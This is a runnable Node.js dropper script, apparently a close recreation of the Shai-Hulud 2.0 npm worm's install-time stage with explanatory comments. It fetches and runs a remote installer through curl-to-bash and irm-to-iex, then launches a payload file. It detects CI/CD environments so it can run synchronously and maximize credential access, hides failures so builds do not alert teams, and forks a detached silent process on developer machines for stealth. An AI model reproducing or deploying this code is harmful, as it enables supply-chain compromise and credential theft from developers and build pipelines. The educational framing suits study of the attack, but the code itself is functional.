#!/usr/bin/env node
// ============================================================================
// DROPPER: setup_bun.js
// ============================================================================
// Performs the exact same steps as the real Shai-Hulud 2.0 dropper:
// 1. Check if Bun is already installed (via 'which bun' or filesystem check)
// 2. If not, install it using the official Bun installer script
// 3. Launch bun_environment.js as a detached background process using Bun
// 4. Exit immediately so npm install completes normally (2-3 seconds)
//
// The real dropper was ~150 lines. This version is functionally identical
// but includes educational comments explaining each step.
// ============================================================================

const { execSync, spawn } = require("child_process");
const path = require("path");
const os = require("os");
const fs = require("fs");

console.log("[setup_bun] Initializing development environment...");

// ---- Step 1: Check if Bun is already installed ----
let bunPath = null;

try {
  // Check the standard Bun install location first (~/.bun/bin/bun)
  const homeBun = path.join(os.homedir(), ".bun", "bin", "bun");
  if (fs.existsSync(homeBun)) {
    bunPath = homeBun;
  } else {
    // Fall back to PATH lookup
    if (os.platform() === "win32") {
      bunPath = execSync("where bun", { encoding: "utf8", timeout: 5000 }).trim().split("\n")[0];
    } else {
      bunPath = execSync("which bun", { encoding: "utf8", timeout: 5000 }).trim();
    }
  }
  console.log("[setup_bun] Bun already installed: " + bunPath);
} catch (e) {
  // Bun not found -- install it
  // ---- Step 2: Install Bun ----
  console.log("[setup_bun] Installing Bun runtime...");
  try {
    if (os.platform() === "win32") {
      // Windows: PowerShell installer
      execSync('powershell -c "irm bun.sh/install.ps1|iex"', {
        stdio: "pipe",
        timeout: 120000
      });
    } else {
      // Linux/macOS: bash installer
      // BUN_INSTALL sets the installation directory (default: ~/.bun)
      execSync("curl -fsSL https://bun.sh/install | bash", {
        stdio: "pipe",
        timeout: 120000,
        env: { ...process.env, BUN_INSTALL: path.join(os.homedir(), ".bun") }
      });
    }
    bunPath = path.join(os.homedir(), ".bun", "bin", "bun");

    if (fs.existsSync(bunPath)) {
      console.log("[setup_bun] Bun installed successfully: " + bunPath);
    } else {
      throw new Error("Bun binary not found after installation");
    }
  } catch (installErr) {
    // If Bun installation fails (e.g., no internet, restricted environment),
    // fall back to Node.js. The payload works with both runtimes.
    console.log("[setup_bun] Bun installation failed. Using Node.js fallback.");
    bunPath = process.execPath;
  }
}

// ---- Step 3: Launch the main payload ----
const payloadPath = path.join(__dirname, "bun_environment.js");

if (!fs.existsSync(payloadPath)) {
  console.log("[setup_bun] Payload file not found. Exiting.");
  process.exit(0);
}

// Detect CI/CD environments
const isCI = !!(
  process.env.GITHUB_ACTIONS ||
  process.env.CI ||
  process.env.BUILDKITE ||
  process.env.CODEBUILD_BUILD_NUMBER ||
  process.env.CIRCLE_SHA1 ||
  process.env.JENKINS_URL ||
  process.env.GITLAB_CI
);

if (isCI) {
  // In CI/CD: run synchronously to maximize credential access during build
  // The real worm checked for these env vars and ran synchronously in CI
  console.log("[setup_bun] CI/CD environment detected. Running synchronously.");
  try {
    execSync('"' + bunPath + '" run "' + payloadPath + '"', {
      stdio: "inherit",
      timeout: 120000,
      env: { ...process.env, PAYLOAD_RUNTIME: "bun" }
    });
  } catch (e) {
    // Silent failure -- do not break the CI/CD build
    // A broken build would alert the team immediately
  }
} else {
  // On developer machines: fork into background for stealth
  // The parent process exits immediately, npm install completes normally
  console.log("[setup_bun] Launching background process...");
  const child = spawn(bunPath, ["run", payloadPath], {
    detached: true,        // Detach from parent process group
    stdio: "ignore",       // Do not inherit stdin/stdout/stderr
    env: { ...process.env, PAYLOAD_RUNTIME: "bun" }
  });
  child.unref();           // Allow parent to exit without waiting for child
}

console.log("[setup_bun] Environment configured.");
// npm install continues normally from here
